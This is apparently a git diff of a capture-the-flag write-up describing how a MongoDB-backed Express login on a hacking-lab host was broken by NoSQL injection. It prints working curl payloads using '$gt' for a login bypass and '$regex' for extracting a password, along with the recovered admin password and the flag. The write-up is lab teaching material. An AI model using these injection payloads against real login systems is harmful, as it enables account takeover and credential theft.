@@ -6,49 +6,49 @@
 
 ---
 
-Sql inject. Question params.. ??
+My first ideas were to try SQL injection, tamper question IDs and do some basic password guessing. With no luck.
+One must be very careful to catch the hints.. 
+For example:
+
+*We're currently migrating our database to support **humongous** amounts of questions. During this time it's not possible
+to create or answer questions or create new accounts.*
+
+Or
+
+*Which NoSQL database do you use?*
+
+*Depends on the use case. Try Redis, Neo4J, Couchbase, Cassandra or **MongoDB** just to name a few.*
 
 
-Email username !!!
-Built on Express
+This all points to the famous NoSQL database [MongoDB](https://www.mongodb.com/).
 
-SQL injection?
- https://pentest-tools.com/website-vulnerability-scanning/sql-injection-scanner-online
- GUESS NOT
- 
-Login (Email username )
- no_one, 
- the_admin
- null
- the_bean
- hax0r
- 
-Question IDs
+There is also a hint hidden in `robots.txt` but it is pretty useless: `Maybe the_admin knows more about the flag.`
 
-http://whale.hacking-lab.com:3371/robots.txt
-Maybe the_admin knows more about the flag.
+This article [HACKING NODEJS AND MONGODB](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html)
+helped me a lot.
 
-site:http://whale.hacking-lab.com:3371/
+This is how you can bypass the login:
+```
+curl -H "Content-Type: application/json" -d '{ "username": "the_admin", "password": {"$gt": ""} }' http://whale.hacking-lab.com:3371/login
+```
 
-curl http://example.com:8080/endpoint?name=Itchy&name=Scratchy
+I was curious what is the admin's password. This payload helped me to guess the password characters.
+```
+curl -H "Content-Type: application/json" -d '{ "username": "the_admin", "password": {"$regex": "^[A-Za-z0-9_]*$"} }' http://whale.hacking-lab.com:3371/login
+```
 
-Cookies
+And with help of my [PasswordCracker](PasswordCracker.kt) I was able to recover the admin's password: `76eKxMEQFcfG3fPe`
 
-https://medium.com/bugbountywriteup/celestial-a-node-js-deserialization-hackthebox-walk-through-c71a4da14eaa
+I logged in and learnt that I need to recover the password of user `null`.
 
-5ce77d7caecd0f0015ce8500
-5ce77d7caecd0f0015ce84fa
+```
+Should my password really be the flag?
+Asked by null
 
-Passwords
+No, I think we should change it.
+Let's do it after the migration!
+The migration is done but the password is still the same...
+```
 
-the_admin / 76eKxMEQFcfG3fP
-null N0SQL_injections_are_a_thing
-
-
-https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html
-
-
-curl -v -X POST -H "Content-Type: application/json" -d '{ "username": {"$gt": ""}, "password": {"$gt": ""} }' http://whale.hacking-lab.com:3371/login
-
-curl  -H "Content-Type: application/json" -d '{ "username": "the_admin", "password": {"$regex": "^[a-zA-Z_]*$"} }' http://whale.hacking-lab.com:3371/login
-
+Just changing the username and running [PasswordCracker](PasswordCracker.kt) once more.
+The null's password (and also the flag) is: `N0SQL_injections_are_a_thing`
